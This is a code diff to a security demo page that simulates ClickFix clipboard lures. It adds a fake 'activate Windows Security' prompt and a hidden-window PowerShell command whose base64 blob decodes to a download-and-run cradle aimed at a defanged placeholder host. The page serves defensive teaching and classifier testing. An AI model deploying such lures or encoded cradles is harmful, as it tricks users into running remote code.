@@ -191,6 +191,16 @@
   .payload-box::selection, .payload-box ::selection{ background:#50E8A8; color:#07231E; }
   .payload-cap{ display:block; text-align:center; margin:10px auto 0; font-size:11px; color:#8a8a8a;
     font-family:var(--sans); }
+  .decode-btn{ margin:14px auto 0; display:flex; align-items:center; gap:7px; background:#0A332C; color:#EAF3EE;
+    border:none; border-radius:7px; padding:9px 16px; font-size:12.5px; font-weight:600; font-family:var(--sans); }
+  .decode-btn:hover{ background:#0e463b; }
+  .decode-reveal{ margin:14px auto 0; max-width:344px; text-align:left; border:1px dashed #b23127;
+    border-radius:8px; background:#fbecea; padding:12px 14px; }
+  .decode-reveal .dr-label{ font-family:var(--mono); font-size:10px; letter-spacing:.08em; text-transform:uppercase;
+    color:#9c2b22; font-weight:600; }
+  .decode-reveal .dr-cmd{ margin-top:7px; font-family:var(--mono); font-size:11.5px; line-height:1.6; color:#7a1e17;
+    word-break:break-all; }
+  .decode-reveal .dr-note{ margin-top:9px; font-size:11px; color:#8a3a33; font-family:var(--sans); line-height:1.5; }
 
   .copy-btn{ margin-top:22px; display:inline-flex; align-items:center; gap:8px; background:#0A332C; color:#EAF3EE;
     border:none; border-radius:8px; padding:12px 22px; font-size:13.5px; font-weight:600; font-family:var(--sans);
@@ -343,6 +353,8 @@
       <button class="tab" role="tab" aria-selected="false" data-scenario="update">🌐 Browser update failed</button>
       <button class="tab" role="tab" aria-selected="false" data-scenario="alert">⚠️ Threat detected</button>
       <button class="tab" role="tab" aria-selected="false" data-scenario="manual">📋 Manual copy (no script)</button>
+      <button class="tab" role="tab" aria-selected="false" data-scenario="encoded">🧬 Encoded (base64)</button>
+      <button class="tab" role="tab" aria-selected="false" data-scenario="benign">✅ Benign control</button>
     </div>
 
     <div class="stage">
@@ -551,6 +563,52 @@
         {t:' | iex', flag:true, note:'A "download cradle": fetch the script and run it immediately in memory, nothing saved to disk to inspect.'},
         {t:'"', flag:false}
       ]
+    },
+    encoded: {
+      title: "security-activation.example",
+      b64: 'aXdyIC11c2ViIGh4eHBzOi8vdmVyaWZ5LWNkblsuXWludmFsaWQvcnVuLnBzMQ==',
+      lureHTML:
+        '<div class="os-body">'+
+          '<div class="lure-icon" style="margin:0 0 16px;">🧬</div>'+
+          '<h4>Finish activating Windows Security</h4>'+
+          '<p class="sub">Run the one-time activation command below to re-enable protection on this device.</p>'+
+          '<ol class="steps-list">'+
+            '<li>1. Press <b>Windows key + R</b></li>'+
+            '<li>2. Press <b>Ctrl + V</b></li>'+
+            '<li>3. Press <b>Enter</b></li>'+
+          '</ol>'+
+          '<button class="copy-btn" data-copy="encoded">📋 Copy fix command (real clipboard write)</button>'+
+          '<button class="decode-btn" id="decodeBtn">🔓 Decode the base64</button>'+
+          '<div id="decodeReveal"></div>'+
+          '<div class="log" id="logHost"></div>'+
+        '</div>',
+      command: 'powershell -nop -w hidden -c "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\'aXdyIC11c2ViIGh4eHBzOi8vdmVyaWZ5LWNkblsuXWludmFsaWQvcnVuLnBzMQ==\')))"',
+      extraNote: '🧬 Why this one matters for the demo: the malicious URL and the <code style="font-family:var(--mono)">iwr | iex</code> only exist <b>after</b> the base64 is decoded at runtime. A defense that blocks on keyword matches sees a clean-looking blob and lets it through. Catching this needs content inspection that decodes or judges intent — the case for the AI-classifier mode over pattern-matching.',
+      tokens: [
+        {t:'powershell ', flag:false},
+        {t:'-nop', flag:true, note:'“No profile” — skips the user’s PowerShell profile so nothing interferes. A staple of malicious one-liners.'},
+        {t:' -w hidden', flag:true, note:'Hidden window — the console never becomes visible.'},
+        {t:' -c "iex(', flag:true, note:'Invoke-Expression — runs whatever string it is handed as live code.'},
+        {t:'[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(', flag:true, note:'Decodes the base64 blob back into a command AT RUNTIME. This is the obfuscation layer — the real command only exists after this runs.'},
+        {t:'\'aXdyIC11c2ViIGh4eHBz…cnVuLnBzMQ==\'', flag:true, note:'The hidden command, base64-encoded. A scanner that pattern-matches on “iwr”, “| iex”, or a URL sees NONE of them here — just random-looking characters. Decode it and it is: iwr -useb hxxps://verify-cdn[.]invalid/run.ps1'},
+        {t:')))"', flag:false}
+      ]
+    },
+    benign: {
+      title: "acme-starter-kit.example",
+      benign: true,
+      lureHTML:
+        '<div class="os-body">'+
+          '<div class="lure-icon" style="margin:0 0 16px;background:#e7f7ef;color:#0B7A55;">📦</div>'+
+          '<h4>Get started with the Acme Starter Kit</h4>'+
+          '<p class="sub">Clone the project and start building. This is an ordinary, legitimate “copy to clipboard” — the kind real sites offer all day.</p>'+
+          '<div class="payload-box" style="color:#0f4f3f;background:#eef7f2;border-color:#bfe0d1;">git clone https://github.com/acme/starter-kit.git</div>'+
+          '<button class="copy-btn" data-copy="benign" style="background:#0B7A55;">📋 Copy install command (real clipboard write)</button>'+
+          '<span class="payload-cap">a legitimate copy — the thing the classifier should let through, and blunt API-blocking wrongly stops</span>'+
+          '<div class="log" id="logHost"></div>'+
+        '</div>',
+      command: 'git clone https://github.com/acme/starter-kit.git',
+      tokens: []
     }
   };
 
@@ -656,11 +714,17 @@
         if (!result.ok){
           copyBtn.textContent = '⛔ Write blocked';
           copyBtn.classList.add('blocked');
-          addLogRow('blocked', 'Write via '+result.method+' — BLOCKED before it reached the clipboard');
-          pasteHint.textContent = '↳ the write was blocked — nothing to paste';
-          pasteHint.style.color = 'var(--safe)';
+          if (s.benign){
+            addLogRow('ok', 'Even this legitimate copy was blocked — API-only mode can’t tell benign from malicious (false positive)');
+            pasteHint.textContent = '↳ a harmless copy got blocked too — the cost of blocking the API without inspecting content';
+            pasteHint.style.color = 'var(--warn)';
+          } else {
+            addLogRow('blocked', 'Write via '+result.method+' — BLOCKED before it reached the clipboard');
+            pasteHint.textContent = '↳ the write was blocked — nothing to paste';
+            pasteHint.style.color = 'var(--safe)';
+          }
         } else {
-          copyBtn.textContent = '⚠️ Written (verifying…)';
+          copyBtn.textContent = s.benign ? '✅ Copied' : '⚠️ Written (verifying…)';
           copyBtn.classList.add('written');
           addLogRow('warn', 'Write via '+result.method+' — call succeeded, checking what actually landed…');
           await new Promise(function(r){ setTimeout(r, 300); });
@@ -668,9 +732,13 @@
           if (!check.readable){
             addLogRow('warn', 'Cannot read clipboard back (permission not granted) — write status unconfirmed');
           } else if (check.text === s.command){
-            addLogRow('ok', 'Clipboard contains the raw payload — not intercepted');
+            addLogRow(s.benign ? 'blocked' : 'ok', s.benign
+              ? 'Clipboard holds the legitimate command — allowed through (correct for a benign copy)'
+              : 'Clipboard contains the raw payload — not intercepted');
           } else {
-            addLogRow('blocked', 'Clipboard now differs from the payload (currently: "'+(check.text||'').slice(0,40)+'") — looks quarantined/altered');
+            addLogRow('blocked', s.benign
+              ? 'The legitimate command was altered/removed — in API-only mode even benign copies get blocked'
+              : 'Clipboard now differs from the payload (currently: "'+(check.text||'').slice(0,40)+'") — looks quarantined/altered');
           }
           pasteHint.textContent = '↳ now click the Run field, then "Paste"';
           pasteHint.style.color = 'var(--safe)';
@@ -690,6 +758,28 @@
       addLogRow('warn', 'No script runs here — nothing is written until YOU press Ctrl+C. The “Paste” button is hidden on purpose: it would use the Clipboard API, which API-only blocking stops. Ctrl+V is an OS paste and slips right past it.');
       addRecheckButton(s);
       try { runInput.focus({ preventScroll: true }); } catch(e) { runInput.focus(); }
+    }
+
+    var decodeBtn = document.getElementById('decodeBtn');
+    if (decodeBtn && s.b64){
+      decodeBtn.addEventListener('click', function(){
+        var reveal = document.getElementById('decodeReveal');
+        if (!reveal) return;
+        var decoded;
+        try { decoded = atob(s.b64); }           // real base64 decode, live in the page
+        catch(e){ decoded = '(could not decode)'; }
+        reveal.innerHTML =
+          '<div class="decode-reveal">'+
+            '<div class="dr-label">atob(base64) →</div>'+
+            '<div class="dr-cmd">'+escapeHtml(decoded)+'</div>'+
+            '<div class="dr-note">That random-looking blob was a URL fetch all along. A scanner matching on '+
+            '“iwr”, “iex”, or a URL saw none of them in the encoded form — which is exactly why encoding '+
+            'defeats naïve pattern-matching. Paste the base64 into any decoder (e.g. CyberChef → From Base64) '+
+            'to confirm this yourself.</div>'+
+          '</div>';
+        decodeBtn.disabled = true;
+        decodeBtn.style.opacity = '.55';
+      });
     }
   }
 
@@ -724,8 +814,25 @@
   function runIt(){
     var s = scenarios[current];
     var pasted = runInput.value;
-    var isPayload = pasted === s.command;
     var html = '<div class="breakdown">';
+
+    if (s.benign){
+      var arrived = pasted === s.command;
+      html += '<div class="headline safe"><span class="badge">✓</span> Legitimate command — this should be allowed through</div>';
+      html += '<div class="cmd-annotated" style="color:#CFE0D8;">'+escapeHtml(pasted || '(clipboard was empty)')+'</div>';
+      if (arrived){
+        html += '<div class="note safe">✅ A normal “copy to clipboard” — cloning a public repo, no interpreter, no download-and-execute. The <b>AI Classifier</b> should let this through untouched, and it did (it’s sitting in the field). <b>Clipboard API Only</b> mode blocks even this, because it stops the mechanism without reading the content — the false-positive cost the classifier exists to avoid.</div>';
+      } else {
+        html += '<div class="note warn">This harmless command didn’t arrive intact. In <b>Clipboard API Only</b> mode that’s expected — it blocks every programmatic copy, legitimate ones included. That collateral damage is the whole reason a content-aware mode exists.</div>';
+      }
+      html += '</div>';
+      breakdownPanel.innerHTML = html;
+      breakdownPanel.style.display = 'block';
+      breakdownPanel.scrollIntoView({behavior: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'auto' : 'smooth', block:'nearest'});
+      return;
+    }
+
+    var isPayload = pasted === s.command;
     if (isPayload){
       html += '<div class="headline danger"><span class="badge">✕</span> This is what actually would have run</div>';
       html += '<div class="cmd-annotated">';
@@ -738,6 +845,9 @@
         html += '<li><span class="chip">FLAG</span><span><b>'+escapeHtml(t.t.trim())+'</b> — '+t.note+'</span></li>';
       });
       html += '</ul>';
+      if (s.extraNote){
+        html += '<div class="note warn">'+s.extraNote+'</div>';
+      }
       html += '<div class="note warn">⚠️ This payload made it all the way to the clipboard unmodified. In a real ClickFix attack, this is the exact moment the target presses Enter and the command runs — no further clicks, no confirmation dialog. This page still cannot execute it for you.</div>';
     } else {
       html += '<div class="headline safe"><span class="badge">✓</span> The malicious payload never reached this dialog</div>';
